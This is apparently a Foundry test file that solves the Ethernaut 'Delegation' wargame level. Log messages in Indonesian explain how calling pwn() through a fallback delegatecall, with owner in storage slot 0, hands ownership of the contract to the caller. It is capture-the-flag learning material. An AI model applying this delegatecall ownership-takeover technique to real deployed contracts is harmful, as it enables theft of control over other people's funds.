// SPDX-License-Identifier: MIT
pragma solidity ^0.8;

import "../Ethernaut.sol";
import "../07-Delegation/DelegationFactory.sol";
import "forge-std/Test.sol";

contract DelegationAttack is Test {
    function testDelegation() external {
        vm.createSelectFork(vm.envString("sepolia"));
        address salsa = makeAddr("salsa");
        vm.deal(salsa, 10 ether);
        Ethernaut ethernaut = new Ethernaut();
        DelegationFactory factory = new DelegationFactory();
        ethernaut.registerLevel(factory);
        vm.startPrank(salsa, salsa);
        address addr = ethernaut.createLevelInstance(factory);
        Delegation delegation = Delegation(addr);
        bool beda = delegation.owner() != salsa;
        assertTrue(beda);
        emit log("setup done");
        emit log("goal: mengklaim kepemilikan");
        emit log("penjelasan");
        emit log(
            "delegatecall memungkinkan memanggil fungsi dari kontrak yang didelegasikan dan mengubah state variable tanpa mengubah variable kontrak delegasi"
        );
        emit log("berbeda dengan call; delegatecall tetap mempertahankan tx.origin dan msg.sender tetap sama");
        emit log(
            "state variable yang berubah tergantung posisi pada slot, jika yang diubah fungsi adalah variable pada slot 1, maka variable yg berubah adalah variable slot 1 pada kontrak yang mendelgasikan"
        );
        emit log("PoC");
        emit log("1. meanggil fungsi pwn() pada delegation");
        address(delegation).call(abi.encodeWithSignature("pwn()"));
        emit log(
            "2. karena pwn() tidak ada, maka akan memicu fallback yang didalamnya mendelegasikan msg.data yang diterima ke contract delegate"
        );
        emit log(
            "3. pwn() pada delegate akan mengubah owner menjadi msg.sender; disamping itu owner pada delegate dan delegation sama-sama ada di slot 0"
        );
        bool sukses = ethernaut.submitLevelInstance(payable(address(delegation)));
        assertTrue(sukses);
    }
}
